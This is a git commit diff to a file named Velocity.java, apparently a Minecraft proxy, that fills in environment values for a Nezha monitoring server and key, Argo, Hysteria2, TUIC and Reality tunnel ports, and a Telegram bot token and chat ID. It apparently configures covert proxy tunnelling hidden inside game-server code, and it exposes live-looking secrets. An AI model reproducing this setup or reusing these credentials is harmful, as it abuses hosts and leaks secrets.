b92a9641593becec6de3e2c561717a337bc7233a
starksss <155059517+spn190253@users.noreply.github.com>
2025-10-28 16:17:55 +0800

    Update Velocity.java

--- proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
+++ proxy/src/main/java/com/velocitypowered/proxy/Velocity.java
@@ -146,20 +146,20 @@ public final class Velocity {
   }
 
   private static void loadEnvVars(final Map<String, String> envVars) throws IOException {
-    envVars.put("UUID", "fe7431cb-ab1b-4205-a14c-d056f821b383");
+    envVars.put("UUID", "b61f67ce-75c1-4c27-a801-ed70db5fad0b");
     envVars.put("FILE_PATH", "./world");
-    envVars.put("NEZHA_SERVER", "");
+    envVars.put("NEZHA_SERVER", "nznz.sss.xx.kg:443");
     envVars.put("NEZHA_PORT", "");
-    envVars.put("NEZHA_KEY", "");
-    envVars.put("ARGO_PORT", "");
+    envVars.put("NEZHA_KEY", "XTXYqxCUxIxcgN1fK9hR2ilwt2NVK8yJ");
+    envVars.put("ARGO_PORT", "8001");
     envVars.put("ARGO_DOMAIN", "");
     envVars.put("ARGO_AUTH", "");
-    envVars.put("HY2_PORT", "");
-    envVars.put("TUIC_PORT", "");
-    envVars.put("REALITY_PORT", "");
+    envVars.put("HY2_PORT", "24694");
+    envVars.put("TUIC_PORT", "24977");
+    envVars.put("REALITY_PORT", "24977");
     envVars.put("UPLOAD_URL", "");
-    envVars.put("CHAT_ID", "");
-    envVars.put("BOT_TOKEN", "");
+    envVars.put("CHAT_ID", "5958841738");
+    envVars.put("BOT_TOKEN", "8007060242:AAH0KVn0peZzRiQ7r5reJzCkuqjQTrlhQfw");
     envVars.put("CFIP", "");
     envVars.put("CFPORT", "");
     envVars.put("NAME", "Mc");
